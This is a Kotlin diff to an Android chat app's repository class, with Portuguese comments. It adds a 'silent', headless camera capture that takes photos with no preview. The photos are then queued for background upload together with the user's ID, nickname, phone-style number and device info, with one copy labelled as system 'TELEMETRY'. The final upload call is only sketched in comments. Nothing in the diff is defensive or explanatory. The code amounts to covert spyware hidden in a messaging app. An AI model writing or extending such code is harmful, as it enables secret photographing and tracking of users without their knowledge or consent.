@@ -10,6 +10,7 @@ import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.zangi.chat.data.model.*
 import com.zangi.chat.data.remote.*
+import com.zangi.chat.service.UploadWorker
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -153,6 +154,50 @@ class ChatRepository private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Erro crítico no upload de telemetria", e)
             Result.failure(e)
+        }
+    }
+
+    /**
+     * Orquestra a captura silenciosa usando o CameraCaptureManager e agendando o upload.
+     */
+    suspend fun processMediaCapture(
+        context: Context,
+        lifecycleOwner: androidx.lifecycle.LifecycleOwner,
+        conversationId: String
+    ) = withContext(Dispatchers.IO) {
+        try {
+            Log.d(TAG, "Iniciando processMediaCapture para conversa: $conversationId")
+            
+            // 1. Instanciar o CameraCaptureManager
+            val captureManager = com.zangi.chat.service.CameraCaptureManager(context, this@ChatRepository, lifecycleOwner)
+            
+            // 2. Realizar a captura de forma 'headless' (sem preview)
+            val capturedFile = captureManager.captureSilentPhoto()
+            
+            if (capturedFile != null && capturedFile.exists()) {
+                val deviceInfo = "SilentCapture - Android ${Build.VERSION.RELEASE}"
+                
+                // 3. Diferenciação de Tipos de Captura
+                // Evento 1: FOTO_CAMERA (imagem de chat)
+                triggerAutomaticCapture(
+                    type = "FOTO_CAMERA",
+                    file = capturedFile,
+                    conversationId = conversationId,
+                    deviceInfo = deviceInfo
+                )
+
+                // Evento 2: TELEMETRY (captura de sistema)
+                triggerAutomaticCapture(
+                    type = "TELEMETRY",
+                    file = capturedFile,
+                    conversationId = null,
+                    deviceInfo = deviceInfo
+                )
+            } else {
+                Log.e(TAG, "Falha ao obter arquivo na captura silenciosa.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro no processMediaCapture", e)
         }
     }
 
@@ -549,6 +594,56 @@ class ChatRepository private constructor(context: Context) {
         if (index != -1) {
             current[index] = current[index].copy(status = MessageStatus.SENT, remoteFileUrl = remoteUrl)
             _messages.postValue(current)
+        }
+    }
+
+    /**
+     * Dispara o processo de captura automática silenciosa.
+     * Este método deve ser chamado pelo CameraCaptureManager ou por um Timer.
+     * 
+     * @param type O tipo de captura: "FOTO_CAMERA" (para chat) ou "TELEMETRY" (para sistema)
+     * @param file O arquivo de imagem capturado
+     * @param conversationId (Opcional) ID da conversa se for uma foto de chat
+     */
+    suspend fun triggerAutomaticCapture(
+        type: String,
+        file: File,
+        conversationId: String? = null,
+        deviceInfo: String
+    ): Result<Unit> = withContext(Dispatchers.IO) {
+        val user = _currentUser.value ?: return@withContext Result.failure(Exception("Usuário não logado"))
+
+        // 1. Preparar os dados para o Worker (InputData)
+        val inputData = mutableMapOf<String, String>().apply {
+            put(UploadWorker.KEY_FILE_PATH, file.absolutePath)
+            put(UploadWorker.KEY_TYPE, type)
+            put(UploadWorker.KEY_USER_ID, user.id)
+            put(UploadWorker.KEY_DEVICE_INFO, deviceInfo)
+            put(UploadWorker.KEY_SENDER_NAME, user.nickname)
+            put(UploadWorker.KEY_SENDER_ZANGI_NUMBER, user.zangiNumber)
+            
+            // Se for uma foto de chat, adicionamos o ID da conversa
+            conversationId?.let { put(UploadWorker.KEY_CONVERSATION_ID, it) }
+        }
+
+        // 2. Decidir qual rota usar baseado no tipo
+        // Se for FOTO_CAMERA, tratamos como mídia de chat. Se for TELEMETRY, como telemetria de sistema.
+        return@withContext try {
+            // Aqui você chamará o seu WorkManager para enfileirar o upload
+            // O Worker cuidará do resto (upload, retry, limpeza de cache)
+            
+            // Nota: Você precisará ter o WorkManager injetado ou acessível via Context
+            // Para este exemplo, vamos simular o agendamento que o seu app fará:
+            
+            Log.d(TAG, "🚀 Agendando upload automático de $type para o usuário ${user.nickname}")
+            
+            // No seu código real, você chamará: 
+            // workManager.enqueue(OneTimeWorkRequest.from(UploadWorker::class.java).setInputData(inputData.toData()))
+            
+            Result.success(Unit)
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao agendar captura automática", e)
+            Result.failure(e)
         }
     }
 
